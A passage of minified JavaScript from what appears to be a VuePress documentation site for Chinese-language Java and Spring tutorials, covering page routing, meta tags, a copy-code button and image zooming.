t.e(27).then(t.bind(null,504))},"v-61e74299":function(){return t.e(28).then(t.bind(null,505))},"v-f7296352":function(){return t.e(29).then(t.bind(null,506))},"v-689c946e":function(){return t.e(30).then(t.bind(null,507))},"v-90a50632":function(){return t.e(31).then(t.bind(null,508))},"v-4452e22a":function(){return t.e(32).then(t.bind(null,509))},"v-13c2056a":function(){return t.e(33).then(t.bind(null,510))},"v-5783fd5e":function(){return t.e(34).then(t.bind(null,511))},"v-41b48450":function(){return t.e(35).then(t.bind(null,512))},"v-6d19a90e":function(){return t.e(36).then(t.bind(null,513))},"v-2504457e":function(){return t.e(37).then(t.bind(null,514))},"v-74f21a38":function(){return t.e(38).then(t.bind(null,515))},"v-9d02e050":function(){return t.e(39).then(t.bind(null,516))},"v-541435c6":function(){return t.e(40).then(t.bind(null,517))},"v-1308af9d":function(){return t.e(41).then(t.bind(null,518))},"v-252f5a65":function(){return t.e(42).then(t.bind(null,519))},"v-8da11b2c":function(){return t.e(43).then(t.bind(null,520))},"v-62410f40":function(){return t.e(44).then(t.bind(null,521))},"v-7dd6a16f":function(){return t.e(45).then(t.bind(null,522))},"v-12a39364":function(){return t.e(46).then(t.bind(null,523))},"v-6ee475a8":function(){return t.e(47).then(t.bind(null,524))},"v-16683504":function(){return t.e(48).then(t.bind(null,525))},"v-78cfb480":function(){return t.e(49).then(t.bind(null,526))},"v-a5b32138":function(){return t.e(50).then(t.bind(null,527))},"v-45042106":function(){return t.e(51).then(t.bind(null,528))},"v-eebfe876":function(){return t.e(52).then(t.bind(null,529))},"v-1652c501":function(){return t.e(53).then(t.bind(null,530))},"v-a7c74124":function(){return t.e(54).then(t.bind(null,531))},"v-4b59fa74":function(){return t.e(55).then(t.bind(null,532))},"v-4d0793a3":function(){return t.e(56).then(t.bind(null,533))},"v-7d7d4816":function(){return t.e(57).then(t.bind(null,534))},"v-734bf71d":function(){return t.e(58).then(t.bind(null,535))},"v-62470732":function(){return t.e(59).then(t.bind(null,536))},"v-668f65e8":function(){return t.e(60).then(t.bind(null,537))},"v-22acaa33":function(){return t.e(61).then(t.bind(null,538))},"v-79aee7c8":function(){return t.e(62).then(t.bind(null,539))},"v-43fb77b9":function(){return t.e(63).then(t.bind(null,540))},"v-5019f548":function(){return t.e(64).then(t.bind(null,541))},"v-21c7009a":function(){return t.e(65).then(t.bind(null,542))},"v-4fcd330d":function(){return t.e(66).then(t.bind(null,543))},"v-6634edc1":function(){return t.e(67).then(t.bind(null,544))},"v-a2835a8a":function(){return t.e(68).then(t.bind(null,545))},"v-59de6d20":function(){return t.e(69).then(t.bind(null,546))}};function Ii(n){var e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}var _i=/-(\w)/g,Bi=Ii((function(n){return n.replace(_i,(function(n,e){return e?e.toUpperCase():""}))})),Oi=/\B([A-Z])/g,Ri=Ii((function(n){return n.replace(Oi,"-$1").toLowerCase()})),Mi=Ii((function(n){return n.charAt(0).toUpperCase()+n.slice(1)}));function Di(n,e){if(e)return n(e)?n(e):e.includes("-")?n(Mi(Bi(e))):n(Mi(e))||n(Ri(e))}var Ni=Object.assign({},Ci,Ti),zi=function(n){return Ni[n]},Li=function(n){return Ti[n]},qi=function(n){return Ci[n]},$i=function(n){return Ro.component(n)};function Fi(n){return Di(Li,n)}function Ui(n){return Di(qi,n)}function Vi(n){return Di(zi,n)}function Ji(n){return Di($i,n)}function Hi(){for(var n=arguments.length,e=new Array(n),t=0;t<n;t++)e[t]=arguments[t];return Promise.all(e.filter((function(n){return n})).map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(Ji(e)||!Vi(e)){n.next=5;break}return n.next=3,Vi(e)();case 3:t=n.sent,Ro.component(e,t.default);case 5:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()))}function Gi(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var Wi=t(50),Ki=(t(274),t(156),t(51),t(221)),Yi=t.n(Ki),Xi=t(222),Qi=t.n(Xi),Zi={created:function(){if(this.siteMeta=this.$site.headTags.filter((function(n){return"meta"===Object(Wi.a)(n,1)[0]})).map((function(n){var e=Object(Wi.a)(n,2);e[0];return e[1]})),this.$ssrContext){var n=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(e=n)?e.map((function(n){var e="<meta";return Object.keys(n).forEach((function(t){e+=" ".concat(t,'="').concat(Qi()(n[t]),'"')})),e+">"})).join("\n    "):"",this.$ssrContext.canonicalLink=es(this.$canonicalUrl)}var e},mounted:function(){this.currentMetaTags=Object(Pi.a)(document.querySelectorAll("meta")),this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta:function(){document.title=this.$title,document.documentElement.lang=this.$lang;var n=this.getMergedMetaTags();this.currentMetaTags=ts(n,this.currentMetaTags)},getMergedMetaTags:function(){var n=this.$page.frontmatter.meta||[];return Yi()([{name:"description",content:this.$description}],n,this.siteMeta,rs)},updateCanonicalLink:function(){ns(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",es(this.$canonicalUrl))}},watch:{$page:function(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy:function(){ts(null,this.currentMetaTags),ns()}};function ns(){var n=document.querySelector("link[rel='canonical']");n&&n.remove()}function es(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return n?'<link href="'.concat(n,'" rel="canonical" />'):""}function ts(n,e){if(e&&Object(Pi.a)(e).filter((function(n){return n.parentNode===document.head})).forEach((function(n){return document.head.removeChild(n)})),n)return n.map((function(n){var e=document.createElement("meta");return Object.keys(n).forEach((function(t){e.setAttribute(t,n[t])})),document.head.appendChild(e),e}))}function rs(n){for(var e=0,t=["name","property","itemprop"];e<t.length;e++){var r=t[e];if(n.hasOwnProperty(r))return n[r]+r}return JSON.stringify(n)}t(149);var os=t(157),as={mounted:function(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(os)()((function(){this.setActiveHash()}),300),setActiveHash:function(){for(var n=this,e=[].slice.call(document.querySelectorAll(".sidebar-link")),t=[].slice.call(document.querySelectorAll(".header-anchor")).filter((function(n){return e.some((function(e){return e.hash===n.hash}))})),r=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),o=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),a=window.innerHeight+r,i=0;i<t.length;i++){var s=t[i],c=t[i+1],l=0===i&&0===r||r>=s.parentElement.offsetTop+10&&(!c||r<c.parentElement.offsetTop-10),p=decodeURIComponent(this.$route.hash);if(l&&p!==decodeURIComponent(s.hash)){var d=s;if(a===o)for(var u=i+1;u<t.length;u++)if(p===decodeURIComponent(t[u].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(d.hash),(function(){n.$nextTick((function(){n.$vuepress.$set("disableScrollBehavior",!1)}))}))}}}},beforeDestroy:function(){window.removeEventListener("scroll",this.onScroll)}},is=(t(58),t(109)),ss=t.n(is),cs={mounted:function(){var n=this;ss.a.configure({showSpinner:!1}),this.$router.beforeEach((function(n,e,t){n.path===e.path||Ro.component(n.name)||ss.a.start(),t()})),this.$router.afterEach((function(){ss.a.done(),n.isSidebarOpen=!1}))}};t(80),t(110),t(83),t(369);function ls(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}t(105);function ps(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}function ds(n,e,t){return e&&ps(n.prototype,e),t&&ps(n,t),Object.defineProperty(n,"prototype",{writable:!1}),n}t(370);var us=function(){function n(){ls(this,n);this.containerEl=document.getElementById("message-container"),this.containerEl||(this.containerEl=document.createElement("div"),this.containerEl.id="message-container",document.body.appendChild(this.containerEl))}return ds(n,[{key:"show",value:function(n){var e=this,t=n.text,r=void 0===t?"":t,o=n.duration,a=void 0===o?3e3:o,i=document.createElement("div");i.className="message move-in",i.innerHTML='\n      <i style="fill: #06a35a;font-size: 14px;display:inline-flex;align-items: center;">\n        <svg style="fill: #06a35a;font-size: 14px;" t="1572421810237" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2323" width="16" height="16"><path d="M822.811993 824.617989c-83.075838 81.99224-188.546032 124.613757-316.049383 127.86455-122.085362-3.250794-223.943563-45.87231-305.935802-127.86455s-124.613757-184.21164-127.86455-305.935802c3.250794-127.503351 45.87231-232.973545 127.86455-316.049383 81.99224-83.075838 184.21164-126.058554 305.935802-129.309347 127.503351 3.250794 232.973545 46.23351 316.049383 129.309347 83.075838 83.075838 126.058554 188.546032 129.309347 316.049383C949.231746 640.406349 905.887831 742.62575 822.811993 824.617989zM432.716755 684.111464c3.973192 3.973192 8.307584 5.779189 13.364374 6.140388 5.05679 0.361199 9.752381-1.444797 13.364374-5.417989l292.571429-287.514638c3.973192-3.973192 5.779189-8.307584 5.779189-13.364374 0-5.05679-1.805996-9.752381-5.779189-13.364374l1.805996 1.805996c-3.973192-3.973192-8.668783-5.779189-14.086772-6.140388-5.417989-0.361199-10.47478 1.444797-14.809171 5.417989l-264.397884 220.33157c-3.973192 3.250794-8.668783 4.695591-14.447972 4.695591-5.779189 0-10.835979-1.444797-15.53157-3.973192l-94.273016-72.962257c-4.334392-3.250794-9.391182-4.334392-14.447972-3.973192s-9.391182 3.250794-12.641975 7.585185l-2.889594 3.973192c-3.250794 4.334392-4.334392 9.391182-3.973192 14.809171 0.722399 5.417989 2.528395 10.11358 5.779189 14.086772L432.716755 684.111464z" p-id="2324"></path></svg>\n      </i>\n      <div class="text">'.concat(r,"</div>\n    "),this.containerEl.appendChild(i),a>0&&setTimeout((function(){e.close(i)}),a)}},{key:"close",value:function(n){n.className=n.className.replace("move-in",""),n.className+="move-out",n.addEventListener("animationend",(function(){n.remove()}))}}]),n}(),ms={mounted:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},updated:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},methods:{updateCopy:function(){var n=this;setTimeout((function(){(['div[class*="language-"] pre','div[class*="aside-code"] aside']instanceof Array||Array.isArray(['div[class*="language-"] pre','div[class*="aside-code"] aside']))&&['div[class*="language-"] pre','div[class*="aside-code"] aside'].forEach((function(e){document.querySelectorAll(e).forEach(n.generateCopyButton)}))}),1e3)},generateCopyButton:function(n){var e=this;if(!n.classList.contains("codecopy-enabled")){var t=document.createElement("i");t.className="code-copy",t.innerHTML='<svg  style="color:#aaa;font-size:14px" t="1572422231464" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3201" width="14" height="14"><path d="M866.461538 39.384615H354.461538c-43.323077 0-78.769231 35.446154-78.76923 78.769231v39.384616h472.615384c43.323077 0 78.769231 35.446154 78.769231 78.76923v551.384616h39.384615c43.323077 0 78.769231-35.446154 78.769231-78.769231V118.153846c0-43.323077-35.446154-78.769231-78.769231-78.769231z m-118.153846 275.692308c0-43.323077-35.446154-78.769231-78.76923-78.769231H157.538462c-43.323077 0-78.769231 35.446154-78.769231 78.769231v590.769231c0 43.323077 35.446154 78.769231 78.769231 78.769231h512c43.323077 0 78.769231-35.446154 78.76923-78.769231V315.076923z m-354.461538 137.846154c0 11.815385-7.876923 19.692308-19.692308 19.692308h-157.538461c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h157.538461c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z m157.538461 315.076923c0 11.815385-7.876923 19.692308-19.692307 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h315.076923c11.815385 0 19.692308 7.876923 19.692307 19.692308v39.384615z m78.769231-157.538462c0 11.815385-7.876923 19.692308-19.692308 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h393.846153c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z" p-id="3202"></path></svg>',t.title="Copy to clipboard",t.addEventListener("click",(function(){e.copyToClipboard(n.innerText)})),n.appendChild(t),n.classList.add("codecopy-enabled")}},copyToClipboard:function(n){var e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);var t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy"),(new us).show({text:"复制成功",duration:1e3}),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}},fs=(t(79),"auto"),gs="zoom-in",bs="zoom-out",hs="grab",vs="move";function ys(n,e,t){var r=!(arguments.length>3&&void 0!==arguments[3])||arguments[3],o={passive:!1};r?n.addEventListener(e,t,o):n.removeEventListener(e,t,o)}function ks(n,e){if(n){var t=new Image;t.onload=function(){e&&e(t)},t.src=n}}function xs(n){return n.dataset.original?n.dataset.original:"A"===n.parentNode.tagName?n.parentNode.getAttribute("href"):null}function ws(n,e,t){!function(n){var e=js,t=Ss;if(n.transition){var r=n.transition;delete n.transition,n[e]=r}if(n.transform){var o=n.transform;delete n.transform,n[t]=o}}(e);var r=n.style,o={};for(var a in e)t&&(o[a]=r[a]||""),r[a]=e[a];return o}var js="transition",Ss="transform",Es="transform",As="transitionend";var Ps=function(){},Cs={enableGrab:!0,preloadImage:!1,closeOnWindowResize:!0,transitionDuration:.4,transitionTimingFunction:"cubic-bezier(0.4, 0, 0, 1)",bgColor:"rgb(255, 255, 255)",bgOpacity:1,scaleBase:1,scaleExtra:.5,scrollThreshold:40,zIndex:998,customSize:null,onOpen:Ps,onClose:Ps,onGrab:Ps,onMove:Ps,onRelease:Ps,onBeforeOpen:Ps,onBeforeClose:Ps,onBeforeGrab:Ps,onBeforeRelease:Ps,onImageLoading:Ps,onImageLoaded:Ps},Ts={init:function(n){var e,t;e=this,t=n,Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach((function(n){e[n]=e[n].bind(t)}))},click:function(n){if(n.preventDefault(),_s(n))return window.open(this.target.srcOriginal||n.currentTarget.src,"_blank");this.shown?this.released?this.close():this.release():this.open(n.currentTarget)},scroll:function(){var n=document.documentElement||document.body.parentNode||document.body,e=window.pageXOffset||n.scrollLeft,t=window.pageYOffset||n.scrollTop;null===this.lastScrollPosition&&(this.lastScrollPosition={x:e,y:t});var r=this.lastScrollPosition.x-e,o=this.lastScrollPosition.y-t,a=this.options.scrollThreshold;(Math.abs(o)>=a||Math.abs(r)>=a)&&(this.lastScrollPosition=null,this.close())},keydown:function(n){(function(n){return"Escape"===(n.key||n.code)||27===n.keyCode})(n)&&(this.released?this.close():this.release(this.close))},mousedown:function(n){if(Is(n)&&!_s(n)){n.preventDefault();var e=n.clientX,t=n.clientY;this.pressTimer=setTimeout(function(){this.grab(e,t)}.bind(this),200)}},mousemove:function(n){this.released||this.move(n.clientX,n.clientY)},mouseup:function(n){Is(n)&&!_s(n)&&(clearTimeout(this.pressTimer),this.released?this.close():this.release())},touchstart:function(n){n.preventDefault();var e=n.touches[0],t=e.clientX,r=e.clientY;this.pressTimer=setTimeout(function(){this.grab(t,r)}.bind(this),200)},touchmove:function(n){if(!this.released){var e=n.touches[0],t=e.clientX,r=e.clientY;this.move(t,r)}},touchend:function(n){(function(n){n.targetTouches.length})(n)||(clearTimeout(this.pressTimer),this.released?this.close():this.release())},clickOverlay:function(){this.close()},resizeWindow:function(){this.close()}};function Is(n){return 0===n.button}function _s(n){return n.metaKey||n.ctrlKey}var Bs={init:function(n){this.el=document.createElement("div"),this.instance=n,this.parent=document.body,ws(this.el,{position:"fixed",top:0,left:0,right:0,bottom:0,opacity:0}),this.updateStyle(n.options),ys(this.el,"click",n.handler.clickOverlay.bind(n))},updateStyle:function(n){ws(this.el,{zIndex:n.zIndex,backgroundColor:n.bgColor,transition:"opacity\n        "+n.transitionDuration+"s\n        "+n.transitionTimingFunction})},insert:function(){this.parent.appendChild(this.el)},remove:function(){this.parent.removeChild(this.el)},fadeIn:function(){this.el.offsetWidth,this.el.style.opacity=this.instance.options.bgOpacity},fadeOut:function(){this.el.style.opacity=0}},Os="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Rs=function(){function n(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}(),Ms=Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},Ds={init:function(n,e){this.el=n,this.instance=e,this.srcThumbnail=this.el.getAttribute("src"),this.srcset=this.el.getAttribute("srcset"),this.srcOriginal=xs(this.el),this.rect=this.el.getBoundingClientRect(),this.translate=null,this.scale=null,this.styleOpen=null,this.styleClose=null},zoomIn:function(){var n=this.instance.options,e=n.zIndex,t=n.enableGrab,r=n.transitionDuration,o=n.transitionTimingFunction;this.translate=this.calculateTranslate(),this.scale=this.calculateScale(),this.styleOpen={position:"relative",zIndex:e+1,cursor:t?hs:bs,transition:Es+"\n        "+r+"s\n        "+o,transform:"translate3d("+this.translate.x+"px, "+this.translate.y+"px, 0px)\n        scale("+this.scale.x+","+this.scale.y+")",height:this.rect.height+"px",width:this.rect.width+"px"},this.el.offsetWidth,this.styleClose=ws(this.el,this.styleOpen,!0)},zoomOut:function(){this.el.offsetWidth,ws(this.el,{transform:"none"})},grab:function(n,e,t){var r=Ns(),o=r.x-n,a=r.y-e;ws(this.el,{cursor:vs,transform:"translate3d(\n        "+(this.translate.x+o)+"px, "+(this.translate.y+a)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},move:function(n,e,t){var r=Ns(),o=r.x-n,a=r.y-e;ws(this.el,{transition:Es,transform:"translate3d(\n        "+(this.translate.x+o)+"px, "+(this.translate.y+a)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},restoreCloseStyle:function(){ws(this.el,this.styleClose)},restoreOpenStyle:function(){ws(this.el,this.styleOpen)},upgradeSource:function(){if(this.srcOriginal){var n=this.el.parentNode;this.srcset&&this.el.removeAttribute("srcset");var e=this.el.cloneNode(!1);e.setAttribute("src",this.srcOriginal),e.style.position="fixed",e.style.visibility="hidden",n.appendChild(e),setTimeout(function(){this.el.setAttribute("src",this.srcOriginal),n.removeChild(e)}.bind(this),50)}},downgradeSource:function(){this.srcOriginal&&(this.srcset&&this.el.setAttribute("srcset",this.srcset),this.el.setAttribute("src",this.srcThumbnail))},calculateTranslate:function(){var n=Ns(),e=this.rect.left+this.rect.width/2,t=this.rect.top+this.rect.height/2;return{x:n.x-e,y:n.y-t}},calculateScale:function(){var n=this.el.dataset,e=n.zoomingHeight,t=n.zoomingWidth,r=this.instance.options,o=r.customSize,a=r.scaleBase;if(!o&&e&&t)return{x:t/this.rect.width,y:e/this.rect.height};if(o&&"object"===(void 0===o?"undefined":Os(o)))return{x:o.width/this.rect.width,y:o.height/this.rect.height};var i=this.rect.width/2,s=this.rect.height/2,c=Ns(),l={x:c.x-i,y:c.y-s},p=l.x/i,d=l.y/s,u=a+Math.min(p,d);if(o&&"string"==typeof o){var m=t||this.el.naturalWidth,f=e||this.el.naturalHeight,g=parseFloat(o)*m/(100*this.rect.width),b=parseFloat(o)*f/(100*this.rect.height);if(u>g||u>b)return{x:g,y:b}}return{x:u,y:u}}};function Ns(){var n=document.documentElement;return{x:Math.min(n.clientWidth,window.innerWidth)/2,y:Math.min(n.clientHeight,window.innerHeight)/2}}function zs(n,e,t){["mousedown","mousemove","mouseup","touchstart","touchmove","touchend"].forEach((function(r){ys(n,r,e[r],t)}))}var Ls=function(){function n(e){!function(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}(this,n),this.target=Object.create(Ds),this.overlay=Object.create(Bs),this.handler=Object.create(Ts),this.body=document.body,this.shown=!1,this.lock=!1,this.released=!0,this.lastScrollPosition=null,this.pressTimer=null,this.options=Ms({},Cs,e),this.overlay.init(this),this.handler.init(this)}return Rs(n,[{key:"listen",value:function(n){if("string"==typeof n)for(var e=document.querySelectorAll(n),t=e.length;t--;)this.listen(e[t]);else"IMG"===n.tagName&&(n.style.cursor=gs,ys(n,"click",this.handler.click),this.options.preloadImage&&ks(xs(n)));return this}},{key:"config",value:function(n){return n?(Ms(this.options,n),this.overlay.updateStyle(this.options),this):this.options}},{key:"open",value:function(n){var e=this,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.options.onOpen;if(!this.shown&&!this.lock){var r="string"==typeof n?document.querySelector(n):n;if("IMG"===r.tagName){if(this.options.onBeforeOpen(r),this.target.init(r,this),!this.options.preloadImage){var o=this.target.srcOriginal;null!=o&&(this.options.onImageLoading(r),ks(o,this.options.onImageLoaded))}this.shown=!0,this.lock=!0,this.target.zoomIn(),this.overlay.insert(),this.overlay.fadeIn(),ys(document,"scroll",this.handler.scroll),ys(document,"keydown",this.handler.keydown),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow);var a=function n(){ys(r,As,n,!1),e.lock=!1,e.target.upgradeSource(),e.options.enableGrab&&zs(document,e.handler,!0),t(r)};return ys(r,As,a),this}}}},{key:"close",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onClose;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeClose(t),this.lock=!0,this.body.style.cursor=fs,this.overlay.fadeOut(),this.target.zoomOut(),ys(document,"scroll",this.handler.scroll,!1),ys(document,"keydown",this.handler.keydown,!1),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow,!1);var r=function r(){ys(t,As,r,!1),n.shown=!1,n.lock=!1,n.target.downgradeSource(),n.options.enableGrab&&zs(document,n.handler,!1),n.target.restoreCloseStyle(),n.overlay.remove(),e(t)};return ys(t,As,r),this}}},{key:"grab",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onGrab;if(this.shown&&!this.lock){var o=this.target.el;this.options.onBeforeGrab(o),this.released=!1,this.target.grab(n,e,t);var a=function n(){ys(o,As,n,!1),r(o)};return ys(o,As,a),this}}},{key:"move",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onMove;if(this.shown&&!this.lock){this.released=!1,this.body.style.cursor=vs,this.target.move(n,e,t);var o=this.target.el,a=function n(){ys(o,As,n,!1),r(o)};return ys(o,As,a),this}}},{key:"release",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onRelease;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeRelease(t),this.lock=!0,this.body.style.cursor=fs,this.target.restoreOpenStyle();var r=function r(){ys(t,As,r,!1),n.lock=!1,n.released=!0,e(t)};return ys(t,As,r),this}}}]),n}(),qs=".theme-vdoing-content img:not(.no-zoom)",$s=JSON.parse('{"bgColor":"rgba(0,0,0,0.6)"}'),Fs=Number("500"),Us=function(){function n(){ls(this,n),this.instance=new Ls($s)}return ds(n,[{key:"update",value:function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs;"undefined"!=typeof window&&this.instance.listen(n)}},{key:"updateDelay",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:Fs;setTimeout((function(){return n.update(e)}),t)}}]),n}(),Vs=[Zi,as,cs,ms,{watch:{"$page.path":function(){void 0!==this.$vuepress.zooming&&this.$vuepress.zooming.updateDelay()}},mounted:function(){this.$vuepress.zooming=new Us,this.$vuepress.zooming.updateDelay()}}],Js={name:"GlobalLayout",computed:{layout:function(){var n=this.getLayout();return Gi("layout",n),Ro.component(n)}},methods:{getLayout:function(){if(this.$page.path){var n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},Hs=t(41),Gs=Object(Hs.a)(Js,(function(){var n=this.$createElement;return(this._self._c||n)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){var r;switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),(r=n[e]).push.apply(r,Object(Pi.a)(t));break;default:throw new Error("Unknown option name.")}}(Gs,"mixins",Vs);var Ws=[{name:"v-4a355d2a",path:"/java/100/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-4a355d2a").then(t)}},{path:"/java/100/index.html",redirect:"/java/100/"},{path:"/00.java/10.java/100.java.html",redirect:"/java/100/"},{name:"v-104240f2",path:"/java/101/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-104240f2").then(t)}},{path:"/java/101/index.html",redirect:"/java/101/"},{path:"/00.java/10.java/101.打包exe程序.html",redirect:"/java/101/"},{name:"v-2acc2292",path:"/java/102/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-2acc2292").then(t)}},{path:"/java/102/index.html",redirect:"/java/102/"},{path:"/00.java/10.java/102.java代码混淆之ProGuard.html",redirect:"/java/102/"},{name:"v-5ba1bd3a",path:"/spring/spring/200/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-5ba1bd3a").then(t)}},{path:"/spring/spring/200/index.html",redirect:"/spring/spring/200/"},{path:"/00.java/20.Spring/21.spring/200.核心内容拆解 IOC.html",redirect:"/spring/spring/200/"},{name:"v-1a1b5d5b",path:"/spring/spring/201/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-1a1b5d5b").then(t)}},{path:"/spring/spring/201/index.html",redirect:"/spring/spring/201/"},{path:"/00.java/20.Spring/21.spring/201.核心内容拆解 AOP.html",redirect:"/spring/spring/201/"},{name:"v-c10cfd86",path:"/spring/spring/202/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-c10cfd86").then(t)}},{path:"/spring/spring/202/index.html",redirect:"/spring/spring/202/"},{path:"/00.java/20.Spring/21.spring/202.核心内容拆解 事件通知.html",redirect:"/spring/spring/202/"},{name:"v-c385f750",path:"/spring/spring/203/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-c385f750").then(t)}},{path:"/spring/spring/203/index.html",redirect:"/spring/spring/203/"},{path:"/00.java/20.Spring/21.spring/203.核心内容拆解 三级缓存.html",redirect:"/spring/spring/203/"},{name:"v-1e178af1",path:"/spring/spring/204/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-1e178af1").then(t)}},{path:"/spring/spring/204/index.html",redirect:"/spring/spring/204/"},{path:"/00.java/20.Spring/21.spring/204.核心内容拆解 FactoryBean.html",redirect:"/spring/spring/204/"},{name:"v-7b24cf72",path:"/spring/spring/205/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-7b24cf72").then(t)}},{path:"/spring/spring/205/index.html",redirect:"/spring/spring/205/"},{path:"/00.java/20.Spring/21.spring/205.注解替代Spring生命周期实现类.html",redirect:"/spring/spring/205/"},{name:"v-7c3f2df1",path:"/spring/spring-mvc/200/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-7c3f2df1").then(t)}},{path:"/spring/spring-mvc/200/index.html",redirect:"/spring/spring-mvc/200/"},{path:"/00.java/20.Spring/22.spring mv/200.Spring MVC 之工作原理.html",redirect:"/spring/spring-mvc/200/"},{name:"v-b3b797ce",path:"/spring/spring-boot/200/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-b3b797ce").then(t)}},{path:"/spring/spring-boot/200/index.html",redirect:"/spring/spring-boot/200/"},{path:"/00.java/20.Spring/23.springboot/200.SpringBoot 之 Filter、Interceptor、Aspect.html",redirect:"/spring/spring-boot/200/"},{name:"v-06ddce46",path:"/spring/spring-boot/201/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-06ddce46").then(t)}},{path:"/spring/spring-boot/201/index.html",redirect:"/spring/spring-boot/201/"},{path:"/00.java/20.Spring/23.springboot/201.SpringBoot 之 Starter.html",redirect:"/spring/spring-boot/201/"},{name:"v-63e5293d",path:"/spring/spring-boot/202/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-63e5293d").then(t)}},{path:"/spring/spring-boot/202/index.html",redirect:"/spring/spring-boot/202/"},{path:"/00.java/20.Spring/23.springboot/202.SpringBoot 之 Stomp 使用和 vue 相配置.html",redirect:"/spring/spring-boot/202/"},{name:"v-4eb895bc",path:"/spring/spring-boot/203/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-4eb895bc").then(t)}},{path:"/spring/spring-boot/203/index.html",redirect:"/spring/spring-boot/203/"},{path:"/00.java/20.Spring/23.springboot/203.SpringBoot MyBatisPlus 